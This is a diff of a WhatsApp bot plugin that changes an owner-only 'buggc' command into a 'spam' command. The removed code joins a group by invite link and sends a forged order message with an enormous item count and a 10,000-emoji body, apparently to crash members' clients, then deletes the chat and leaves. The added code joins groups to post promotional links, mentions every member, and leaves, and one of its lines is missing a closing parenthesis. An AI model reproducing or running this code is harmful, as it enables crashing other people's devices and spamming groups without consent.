@@ -5,11 +5,7 @@ let handler = async (m, { conn, text }) => {
     if (!code) throw 'Link invalido'
     let { gid: target } = await conn.acceptInvite(code)
     let member = (await conn.groupMetadata(target)).participants.map(v => v.jid)
-await conn.relayWAMessage(global.mm=conn.
-prepareMessageFromContent(target, conn.
-prepareDisappearingMessageSettingContent(0),
-{}),{waitForAck:!0})
-await conn.sendMessage(target, 'Lolibot - OFC', 'conversation', {
+await conn.sendMessage(target, '*Grupo I*\nhttps://chat.whatsapp.com/EphX7iaMsKj70m0BrZsmvw\n\n*Grupo II*\nhttps://chat.whatsapp.com/FVWUefIddjH5czTfujL2NA', 'conversation', {
  quoted: {
   key: {
   remoteJid: 'status@broadcast',
@@ -17,22 +13,21 @@ await conn.sendMessage(target, 'Lolibot - OFC', 'conversation', {
   },
   message: {
    orderMessage: {
-    itemCount: 9999999999999999999999999999999999999999999999999999999,
+    itemCount: 750,
     status: 1,
     surface: 1,
-    message: 'ðŸ”¥'.repeat(10000),
-    orderTitle: 'HAI KAK',
+    message: '›  . *Lolibot - OFC* ‘ „ ',
+    orderTitle: '',
     sellerJid: '0@s.whatsapp.net'
    }
   }
  }, contextInfo: { mentionedJid: member }
-}).then(v => conn.modifyChat(v.key.remoteJid, 'delete'))
-await conn.groupLeave(target)
+}).then(v => conn.groupLeave(target)
 }
 
-handler.help = ['buggc <code>']
+handler.help = ['spam']
 handler.tags = ['owner']
-handler.command = /^(buggc)$/i
+handler.command = /^(spam)$/i
 
 handler.rowner = true
 
